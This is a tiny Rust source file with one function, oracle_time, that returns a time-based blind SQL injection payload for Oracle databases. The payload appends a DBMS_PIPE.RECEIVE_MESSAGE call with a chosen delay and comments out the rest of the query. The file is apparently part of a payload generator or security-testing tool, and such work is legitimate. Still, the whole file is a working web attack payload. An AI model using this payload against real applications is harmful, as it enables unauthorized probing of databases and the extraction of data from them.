#![deny(unsafe_code)]
#[must_use]
pub fn oracle_time(secs: u64) -> String {
    format!("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{secs}) --")
}
